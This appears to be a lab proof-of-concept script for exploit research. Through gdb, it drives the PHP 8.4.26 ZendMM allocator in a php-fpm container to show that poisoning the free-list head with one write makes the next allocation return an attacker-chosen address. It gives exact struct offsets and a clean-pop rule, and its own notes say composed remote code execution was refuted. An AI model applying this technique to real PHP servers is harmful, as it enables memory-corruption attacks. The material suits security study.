#!/usr/bin/env python3
# INDEX: free-list head seat, one-write arbitrary dest | fpm | gdb-seated
r"""ZendMM free-list HEAD poison -- a SINGLE, UNSHADOWED, chunk-local heap WRITE.

Capability: one raw write heap->free_slot[bin] = T makes the VERY NEXT emalloc(bin)
return the chosen address T (vs the in-slot poison, which needs the alloc-after). An
ordinary PHP write into that allocation then writes attacker bytes to T. Needs only
one 8-byte value at one chunk-local address, NO shadow write and NO shadow_key.

Reach: bounded only by mapped memory -- far chunk offsets and, given a binbase, a
php-fpm image .bss address ~TBs from the chunk.

Mechanism (Zend/zend_alloc.c, php-src 8.4.26): the per-bin free-list heads
heap->free_slot[ZEND_MM_BINS] live in zend_mm_heap at the request chunk base
(chunk+0x40) and are a PLAIN pointer array -- the heap-protection shadow guards only
the in-slot next_free_slot, never the head cell. The pop reads the head raw and
returns it; zend_mm_get_next_free_slot re-checks the shadow only when the popped
slot's own next (T[0]) != NULL. So the clean-pop rule is T[0]==0 (.bss / zeroed
scratch already is); T[0]!=0 re-checks an absent shadow -> zend_mm_panic (SIGABRT).

Preconditions:
  * &free_slot[bin]: chunk-local, = chunk + 0x40 (heap) + 0x28 (free_slot) + bin*8;
    for the 320 size class (bin 16, a 280-byte alloc) = chunk+0xe8. A per-build
    chunk-relative constant, derived live here; NO shadow_key needed.
  * clean pop: T[0]==0.
  * aim T: typically core_globals-relative (binbase), /proc-seeded in the lab.

Not a CVE: a deliberate allocator-corruption technique.

Tested: php-fpm 8.4.26. The allocator mechanism is driven against the live stock
allocator via its exported symbols through an in-container gdb (the analysis
instrument). seat_verdict() records the structural boundary on composing this seat
into a black-box RCE (the poison must be consumed in-request, and the request
boundary memsets free_slot).
"""
from __future__ import annotations

import argparse
import os
import re
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
from common.proc_gdb import (  # noqa: E402
    GdbDriver, compose_exec as _compose_exec, gdb as _gdb,
    pid_alive, read_maps, worker_pids,
)
from _freelist_common import (  # noqa: E402
    FORWARD_CAP, BIN_DATA_SIZE, CHUNK_ALIGN, DEFAULT_ALLOC_SIZE,
    DEFAULT_COMPOSE, MASK64, SHADOW_OFFSET, _FreeListGdb, _base_report,
    _human, _parse_tags, _report_banner,
)

DEFAULT_SERVICE = "seat-fpm"


# The free-list HEAD seat driver.
class FreeListHeadSeat(_FreeListGdb):
    """Drives the LIVE allocator via its exported symbols through gdb.

    locate_head(pid)   -> (heap, bin_num, &free_slot[bin], head_value)  [geometry]
    seat_head(pid, target, ...) -> dict                                 [the seat]
    """

    TAG = "SEAT"

    def __init__(self, compose_file=DEFAULT_COMPOSE, service=DEFAULT_SERVICE,
                 size=DEFAULT_ALLOC_SIZE, verbose=False):
        super().__init__(compose_file, service, size, verbose)

    # offsetof(zend_mm_heap, free_slot) on the shipped 8.4.26-fpm build (stock
    # image, struct NOT in the stripped DWARF -- so a fixed layout, VERIFIED live):
    #   use_custom_heap(int)@0x00 | storage@0x08 | size@0x10 | peak@0x18
    #   | shadow_key@0x20 | free_slot[30]@0x28 ...       (heap = chunk+0x40)
    # => &free_slot[16] = heap + 0x28 + 16*8 = heap + 0xa8 = chunk + 0xe8.
    # 280 bytes rounds up to the 320 size class = bin index 16.
    FREE_SLOT_OFF = 0x28
    BIN16 = 16

    def locate_head(self, pid):
        """Populate the bin-320 free list (alloc+free a 280-byte slot), then
        return the HEAD cell address (&heap->free_slot[16]) via the VERIFIED
        chunk-relative layout, confirming the cell now holds the freed slot. If
        the fixed offset ever fails to match (a differently-configured build), it
        falls back to a gdb `find` scan of the heap struct for the freed slot.
        Returns a dict or None."""
        heap = self.heap_of(pid)
        if heap is None:
            return None
        cell = heap + self.FREE_SLOT_OFF + self.BIN16 * 8
        txt = _gdb(self.compose_file, self.service, pid, [
            f'set $p = (unsigned long)_emalloc({self.size})',
            'call (void)_efree((void*)$p)',
            f'set $cell = (unsigned long*){cell:#x}',
            'printf "SEAT slot=%#lx\\n", $p',
            'printf "SEAT headcell=%#lx\\n", (unsigned long)$cell',
            'printf "SEAT headval=%#lx\\n", *$cell',
            'printf "SEAT match=%d\\n", (*$cell == $p)',
        ])
        t = _parse_tags(txt, "SEAT")
        if t.get("match") == 1 and "headcell" in t:
            if self.verbose:
                print(f"  [locate] pid={pid} heap={heap:#x} bin={self.BIN16} "
                      f"headcell={t['headcell']:#x} (fixed+verified)")
            return {"heap": heap, "bin": self.BIN16, "slot": t["slot"],
                    "headcell": t["headcell"], "headval": t.get("headval"),
                    "how": "fixed-0x28+verified"}
        return self._locate_head_find(pid, heap)

    def _locate_head_find(self, pid, heap):
        """DWARF-less, offset-independent fallback: free a bin-320 slot, then gdb
        `find` the heap struct for the cell that holds it."""
        txt = _gdb(self.compose_file, self.service, pid, [
            f'set $p = (unsigned long)_emalloc({self.size})',
            'call (void)_efree((void*)$p)',
            'printf "SEAT slot=%#lx\\n", $p',
            f'find /g {heap:#x}, {heap:#x}+0x800, $p',
        ])
        t = _parse_tags(txt, "SEAT")
        m = re.search(r"^(0x[0-9a-fA-F]+)\b", txt, re.M)
        cell = None
        for line in txt.splitlines():
            line = line.strip()
            if line.startswith("0x") and "pattern" not in line:
                try:
                    cell = int(line.split()[0], 16)
                    break
                except ValueError:
                    pass
        if cell is None:
            return None
        bin_idx = (cell - heap - self.FREE_SLOT_OFF) // 8
        if self.verbose:
            print(f"  [locate/find] pid={pid} heap={heap:#x} headcell={cell:#x} "
                  f"bin={bin_idx}")
        return {"heap": heap, "bin": bin_idx, "slot": t.get("slot"),
                "headcell": cell, "headval": None, "how": "find"}

    def seat_head(self, pid, target, headcell, dirty_t0=False, writeback=None):
        """THE SEAT: one raw write `*headcell = target` (NO shadow). Then one
        emalloc(bin): with the clean-pop rule (T[0]==0) it returns `target`
        directly. Optionally write `writeback` bytes into the returned allocation
        and read them back.

        dirty_t0=True leaves target[0] NON-zero (the A/B negative): the pop's
        get_next_free_slot(target) then re-checks the absent shadow -> panic.
        """
        exprs = [f'set $T = {target:#x}', f'set $cell = (unsigned long*){headcell:#x}']
        if dirty_t0:
            exprs.append('set *(unsigned long*)$T = 0x4141414141414141')
        else:
            # clean-pop precondition: T[0]==0 (real .bss / zeroed scratch already is)
            exprs.append('set *(unsigned long*)$T = 0')
        exprs += [
            # the SINGLE raw head write -- the whole seat is this one 8-byte store.
            'set *$cell = (unsigned long)$T',
            f'set $q1 = (unsigned long)_emalloc({self.size})',
            'printf "SEAT q1=%#lx\\n", $q1',
            # the head should now be the clean-popped NULL (then alloc_small_slow
            # repaginates); a second emalloc shows normal service resumed.
            f'set $q2 = (unsigned long)_emalloc({self.size})',
            'printf "SEAT q2=%#lx\\n", $q2',
        ]
        if writeback is not None and not dirty_t0:
            wb = writeback[:8].ljust(8, b"\x00")
            lit = "".join("\\%03o" % b for b in wb)
            exprs += [
                f'call (void*)memcpy($T, "{lit}", 8)',
                'printf "SEAT readback=%#lx\\n", *(unsigned long*)$T',
            ]
        txt = _gdb(self.compose_file, self.service, pid, exprs)
        t = _parse_tags(txt, "SEAT")
        alive = pid_alive(self.compose_file, self.service, pid)
        res = {
            "pid": pid, "target": target, "q1": t.get("q1"), "q2": t.get("q2"),
            # the HEAD seat returns T on the VERY NEXT emalloc (q1), unlike the
            # in-slot poison which needs q2.
            "returned_chosen": (t.get("q1") == target),
            "readback": t.get("readback"), "alive": alive,
            "panicked": ("SIGABRT" in txt or "zend_mm" in txt or "corrupted" in txt),
        }
        if self.verbose:
            print(f"  [seat] pid={pid} T={target:#x} q1={res['q1'] and hex(res['q1'])} "
                  f"chosen={res['returned_chosen']} alive={alive} "
                  f"panic={res['panicked']} dirty_t0={dirty_t0}")
        return res


# Structural note on the seat.
def seat_verdict():
    return {
        "head_is_unshadowed": (
            "heap->free_slot[] is a plain pointer array (Zend/zend_alloc.c, not "
            "shadow-encoded); the pop reads the head raw and re-checks the shadow "
            "only on the popped slot's own non-NULL next, so one raw write "
            "free_slot[bin]=T with T[0]==0 makes the next emalloc(bin) return T"),
        "var_hash_rw_can_seat_the_head": (
            "the seat needs one controlled 8-byte value at one chunk-local address "
            "(&heap->free_slot[bin]), with no shadow and no shadow_key"),
        "but_composed_rce_refuted": (
            "seating the head alone is not RCE: the poison must be consumed by an "
            "emalloc(bin) and the popped allocation's contents written in the same "
            "request, and the request boundary memsets free_slot to 0"),
    }


# One full demonstration against the lab (the A/B sweep).
def demonstrate(compose_file, service, size=DEFAULT_ALLOC_SIZE, verbose=True):
    s = FreeListHeadSeat(compose_file, service, size=size, verbose=verbose)
    pids = worker_pids(compose_file, service)
    if not pids:
        raise RuntimeError("no fpm workers (is the seat lab up? curl the front once)")

    report = _base_report(pids, size)
    report["verdict"] = seat_verdict()

    pid = pids[0]
    loc = s.locate_head(pid)
    if loc is None:
        raise RuntimeError(f"could not locate the bin-{size} head on pid {pid}")
    report["target_pid"] = pid
    report["heap"] = loc["heap"]
    report["bin"] = loc["bin"]
    report["headcell"] = loc["headcell"]
    report["free_slot_off"] = loc["headcell"] - loc["heap"]  # = 0x18 + bin*8
    report["locate_how"] = loc["how"]
    chunk = loc["heap"] & ~(CHUNK_ALIGN - 1)
    report["chunk"] = chunk
    report["heap_off_in_chunk"] = loc["heap"] - chunk          # expect 0x40
    report["headcell_off_in_chunk"] = loc["headcell"] - chunk  # chunk-relative const

    maps = read_maps(compose_file, service, pid)
    report["binbase"] = maps.binbase()
    bss = maps.image_bss()
    report["image_bss"] = (bss["start"], bss["end"]) if bss else None

    # (A) POSITIVE: far chunk-local target, clean T[0]==0 -> next emalloc returns T.
    far_chunk = chunk + 0x180000
    report["far_chunk_target"] = far_chunk
    # re-locate the head before each independent seat (a prior clean pop leaves the
    # head NULL / repaginated; a fresh alloc+free repopulates it).
    loc = s.locate_head(pid) or loc
    r_far = s.seat_head(pid, far_chunk, loc["headcell"], writeback=b"P2SSEAT_")
    report["far_chunk"] = r_far

    # (B) POSITIVE: libphp .bss target ~TBs from the chunk (Apache/SHM-class reach).
    report["libphp"] = None
    if bss:
        libphp_t = ((bss["start"] + bss["end"]) // 2) & ~0xF
        report["libphp_target"] = libphp_t
        loc = s.locate_head(pid) or loc
        report["libphp"] = s.seat_head(pid, libphp_t, loc["headcell"],
                                       writeback=b"P2SSEATB")

    # (C) NEGATIVE: same head write but T[0]!=0 -> the follow-on pop re-checks the
    # absent shadow -> zend_mm_panic (proves the clean-pop rule + head-is-raw).
    loc = s.locate_head(pid)
    if loc:
        far2 = chunk + 0x160000
        report["neg_target"] = far2
        report["negative_dirty_t0"] = s.seat_head(pid, far2, loc["headcell"],
                                                   dirty_t0=True)
    return report, s


def print_report(rep):
    P = print
    _report_banner("ZendMM free-list HEAD seat", rep["workers"])
    P("target worker   : pid %s" % rep["target_pid"])
    P("heap / chunk    : heap=%#x  chunk=%#x  (heap in chunk @ +%#x)"
      % (rep["heap"], rep["chunk"], rep["heap_off_in_chunk"]))
    P("bin / head cell : bin=%d  &free_slot[bin]=%#x  (free_slot @ heap+%#x; "
      % (rep["bin"], rep["headcell"], rep["free_slot_off"]))
    P("                  chunk-relative +%#x -- a per-build const, NO shadow_key, "
      "how=%s)" % (rep["headcell_off_in_chunk"], rep["locate_how"]))
    P("binbase         : %s" % (("%#x" % rep["binbase"]) if rep["binbase"] else "n/a"))
    P("-" * 78)
    r = rep["far_chunk"]
    d = rep["far_chunk_target"] - rep["headcell"]
    P("(A) FAR CHUNK aim T=%#x  (%s from the head cell)"
      % (rep["far_chunk_target"], _human(d)))
    P("    SINGLE raw head write (no shadow); next emalloc returned T : %s  q1=%s"
      % (r["returned_chosen"], r["q1"] and hex(r["q1"])))
    P("    worker survived : %s   write-back read : %s"
      % (r["alive"], r["readback"] and hex(r["readback"])))
    P("    vs var_hash_rw ~16 KiB cap : %s past the cap"
      % ("FAR" if d > FORWARD_CAP else "within"))
    if rep.get("libphp"):
        r = rep["libphp"]
        P("-" * 78)
        P("(B) libphp .bss aim T=%#x  (%s from the chunk -- var_hash_rw's steered write CANNOT cross)"
          % (rep["libphp_target"], _human(abs(rep["libphp_target"] - rep["chunk"]))))
        P("    next emalloc returned T : %s  q1=%s   worker survived : %s"
          % (r["returned_chosen"], r["q1"] and hex(r["q1"]), r["alive"]))
    if rep.get("negative_dirty_t0"):
        r = rep["negative_dirty_t0"]
        P("-" * 78)
        P("(C) NEGATIVE T[0]!=0 : emalloc returned T ? %s   worker panicked : %s  "
          "alive : %s" % (r["returned_chosen"], r["panicked"], r["alive"]))
        P("    (proves the clean-pop rule: the follow-on pop re-checks the absent "
          "shadow -> zend_mm_panic)")
    P("=" * 78)
    v = rep["verdict"]
    P("[head is unshadowed] %s" % v["head_is_unshadowed"].split(". ")[0] + ".")
    P("[var_hash_rw can seat head  ] %s" % v["var_hash_rw_can_seat_the_head"].split(". ")[0] + ".")
    P("[composed RCE      ] REFUTED black-box (see seat_verdict(): no in-request "
      "consume+write; request boundary memsets free_slot).")
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(description="ZendMM free-list HEAD seat (fpm 8.4.26)")
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default=DEFAULT_SERVICE)
    ap.add_argument("--size", type=int, default=DEFAULT_ALLOC_SIZE)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)
    # grouped-compose isolation (the _compose_exec helper inherits os.environ).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-seat"
    os.environ["COMPOSE_PROFILES"] = "seat"
    rep, _ = demonstrate(a.compose_file, a.service, size=a.size)
    if a.json:
        import json
        print(json.dumps(rep, indent=2,
                         default=lambda o: hex(o) if isinstance(o, int) else o))
    else:
        print_report(rep)
    ok = rep["far_chunk"]["returned_chosen"] and rep["far_chunk"]["alive"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
